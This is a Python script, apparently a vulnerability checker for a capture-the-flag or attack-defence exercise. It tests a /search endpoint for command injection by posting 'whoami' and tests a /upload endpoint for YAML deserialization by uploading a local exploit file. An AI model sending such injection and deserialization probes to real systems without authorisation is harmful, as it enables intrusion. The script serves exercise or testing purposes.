# -*- coding: utf-8 -*-
import os.path

import requests

headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0'
}


def check_alive(url):
    is_alive = False
    is_index_404 = False
    try:
        response = requests.get(url, headers=headers, timeout=5, allow_redirects=False)
        if response.status_code == 404:
            is_index_404 = True
        if response.status_code == 200 and '<html' in response.text:
            is_alive = True
    except:
        print('check service 请求失败')
    return [is_alive, is_index_404]


# print(check_alive('http://4.2.1.2'))


def check1(url):
    description = '第一次 /search 命令执行'
    is_vlun = False
    is_vlun_404 = False
    try:
        payload = {
            'search': 'whoami'
        }
        res = requests.post(url + '/search', headers=headers, data=payload, timeout=5)
        if res.status_code == 404:
            is_vlun_404 = True
        if 'root' in res.text or 'wenxiao' in res.text:
            is_vlun = True
    except:
        pass

    return [is_vlun, is_vlun_404, description]


# print(check1('http://4.2.31.2'))
# ##字符串和函数之间的映射可以通过globals来事先
# print(globals()['check1']('http://4.2.31.2'))

def check2(url):
    """
    yaml反序列化漏洞
    :param url:
    :return:
    """
    description = '第二处 /upload yaml反序列化漏洞'
    is_vlun = False
    is_vlun_404 = False
    try:
        abs_path = os.path.abspath('.')
        data = {
            'file' : open(f'{abs_path}/exp1.yml','rb')
        }
        res = requests.post(url+'/upload', files=data, timeout=5)
        if res.status_code == 404:
            is_vlun_404 = True
        if 'wenxiao' in res.text or '1' in res.text:
            is_vlun = True
            print(res.text)
    except Exception as e:
        print(e)
        pass
    return [is_vlun, is_vlun_404, description]

# print(check2('http://4.2.31.2/'))

def check(url, point):
    return check_alive(url) + globals()['check' + point](url)

